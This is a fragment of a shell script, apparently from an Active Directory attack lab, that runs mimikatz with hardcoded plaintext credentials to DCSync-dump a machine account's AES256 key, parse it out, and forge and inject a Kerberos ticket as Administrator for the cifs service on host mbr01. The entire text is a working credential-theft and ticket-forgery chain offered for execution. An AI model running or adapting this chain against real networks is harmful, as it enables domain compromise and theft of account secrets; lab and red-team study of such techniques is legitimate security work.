...
ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "C:\Tools\cadre-attack\mimikatz.exe \"lsadump::dcsync /domain:child.cadre.local /user:MBR01\$ /dc:dc02.child.cadre.local /authuser:chief_command /authpassword:C0mm@nd_Ch1ef! /authdomain:cadre\" exit 2>&1 | Tee-Object C:\Tools\cadre-attack\mbr01-dcsync.txt; \$line=(Select-String -Path C:\Tools\cadre-attack\mbr01-dcsync.txt -Pattern 'MBR01.*aes256' | Select-Object -First 1).Line; \$aes=(\$line -split ':')[-1]; C:\Tools\cadre-attack\mimikatz.exe \"kerberos::golden /user:Administrator /domain:child.cadre.local /sid:${CHILD_SID} /service:cifs/mbr01.child.cadre.local /aes256:\$aes /ptt\" \"misc::cmd cmd.exe /c whoami\" exit"
